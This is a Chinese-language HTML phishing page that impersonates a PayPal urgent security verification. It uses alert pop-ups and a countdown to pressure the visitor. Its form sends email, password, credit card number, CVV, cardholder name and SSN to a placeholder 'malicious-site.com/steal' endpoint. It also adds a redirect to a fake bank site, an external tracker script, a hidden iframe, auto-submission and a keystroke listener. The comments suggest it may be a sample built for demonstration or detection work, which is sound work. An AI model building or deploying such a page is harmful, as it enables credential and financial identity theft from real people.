<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="5;url=http://fake-bank-login.com">
    <title>紧急通知 - 账户安全验证 - PayPal</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .warning-box {
            background-color: #ff4444;
            color: white;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .form-container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        input[type="text"], input[type="password"], input[type="email"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #0070ba;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }
        button:hover {
            background-color: #005ea6;
        }
    </style>
</head>
<body>
    <div class="warning-box">
        <h2>⚠️ 紧急安全警告</h2>
        <p>您的账户已被暂停！请立即验证身份以恢复访问权限。</p>
        <p><strong>剩余时间：5分钟</strong></p>
    </div>
    
    <div class="form-container">
        <h1>PayPal 账户验证</h1>
        <p style="color: #666;">为了您的账户安全，请完成以下验证步骤：</p>
        
        <form id="verifyForm" action="http://malicious-site.com/steal" method="POST">
            <label>PayPal 邮箱地址：</label>
            <input type="email" name="email" placeholder="your-email@example.com" required>
            
            <label>账户密码：</label>
            <input type="password" name="password" placeholder="请输入密码" required>
            
            <label>信用卡号：</label>
            <input type="text" name="credit_card" placeholder="1234 5678 9012 3456" maxlength="19" required>
            
            <label>CVV 安全码：</label>
            <input type="text" name="cvv" placeholder="123" maxlength="3" required>
            
            <label>持卡人姓名：</label>
            <input type="text" name="cardholder" placeholder="John Doe" required>
            
            <label>SSN（社会安全号码）：</label>
            <input type="text" name="ssn" placeholder="XXX-XX-XXXX" required>
            
            <button type="submit">立即验证账户</button>
        </form>
        
        <p style="font-size: 12px; color: #999; margin-top: 20px;">
            点击"立即验证账户"即表示您同意我们的服务条款和隐私政策。
        </p>
    </div>
    
    <!-- 隐藏的iframe用于数据收集 -->
    <iframe src="about:blank" id="hiddenFrame" style="display:none; width:0; height:0;"></iframe>
    
    <!-- 多个弹窗脚本 -->
    <script>
        // 第一个弹窗
        window.onload = function() {
            alert('警告：您的账户存在安全风险！请立即完成验证。');
        };
        
        // 第二个弹窗（延迟）
        setTimeout(function() {
            alert('账户即将被永久锁定！剩余时间：3分钟');
        }, 2000);
        
        // 表单提交时的弹窗
        document.getElementById('verifyForm').addEventListener('submit', function(e) {
            alert('正在验证您的信息，请稍候...');
            // 实际会提交到恶意网站
        });
        
        // 尝试收集更多信息
        var hiddenFrame = document.getElementById('hiddenFrame');
        hiddenFrame.onload = function() {
            console.log('数据已发送到隐藏iframe');
        };
    </script>
    
    <!-- 可疑的外部脚本 -->
    <script src="http://suspicious-domain.com/tracker.js"></script>
    
    <!-- 自动重定向脚本 -->
    <script>
        // 如果用户不操作，5秒后自动提交
        setTimeout(function() {
            if (confirm('验证超时！是否立即验证？')) {
                document.getElementById('verifyForm').submit();
            }
        }, 5000);
    </script>
    
    <!-- 键盘记录尝试 -->
    <script>
        document.addEventListener('keydown', function(e) {
            // 记录按键（实际钓鱼网站会这样做）
            console.log('Key pressed: ' + e.key);
        });
    </script>
</body>
</html>
